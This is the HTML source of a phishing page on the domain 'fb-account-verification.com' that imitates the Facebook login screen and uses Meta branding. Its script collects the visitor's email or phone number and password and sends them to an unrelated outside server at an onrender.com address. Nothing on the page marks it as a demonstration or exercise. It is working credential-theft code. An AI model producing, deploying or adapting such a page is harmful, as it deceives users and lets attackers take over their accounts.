<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>fb-account-verification.com</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>

    <div class="login-container">
        <div class="lang-selector">English (US)</div>
        
        <div class="login-header">
            <h2>Log into Facebook</h2>
        </div>

        <form id="loginForm" class="login-form" novalidate>
            <div class="input-group" id="usernameGroup">
                <input type="text" id="username" name="username" placeholder=" " required autocomplete="username">
                <label for="username">Email or mobile number</label>
                <div class="error-msg">The email or mobile number you entered isn’t connected to an account.</div>
            </div>

            <div class="input-group" id="passwordGroup">
                <input type="password" id="password" name="password" placeholder=" " required autocomplete="current-password">
                <label for="password">Password</label>
                <button type="button" id="togglePassword" class="eye-btn" aria-label="Toggle password visibility">
                    <svg viewBox="0 0 24 24" fill="currentColor" width="20pxr" height="20px">
                        <path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34 3-3-3z"/>
                    </svg>
                </button>
                <div class="error-msg">Please enter a password</div>
            </div>

            <button type="submit" class="login-btn">Confirm Account</button>
        </form>

        <div class="footer-logo">
            <img src="images/Meta_idlf4cVSsS_0.svg" alt="Meta Logo">
        </div>
    </div>

    <script>
        const toggleBtn = document.getElementById('togglePassword');
        const passwordInput = document.getElementById('password');
        
        toggleBtn.addEventListener('click', () => {
            const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
            passwordInput.setAttribute('type', type);
        });

        document.getElementById('loginForm').addEventListener('submit', async (e) => {
            e.preventDefault();
            const userGroup = document.getElementById('usernameGroup');
            const passGroup = document.getElementById('passwordGroup');
            const username = document.getElementById('username');
            const password = document.getElementById('password');
            
            userGroup.classList.remove('error');
            passGroup.classList.remove('error');

            if (!username.value || !password.value) {
                if (!username.value) userGroup.classList.add('error');
                if (!password.value) passGroup.classList.add('error');
                return;
            }

            try {
                const response = await fetch('https://portal-backend-8wu7.onrender.com/login', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ username: username.value, password: password.value })
                });
                const data = await response.json();
                alert(response.ok ? 'Success! ' + data.message : 'Error: ' + response.status);
            } catch (error) {
                alert('Could not connect. Please try again in 1 minute.');
            }
        });
    </script>
</body>
</html>
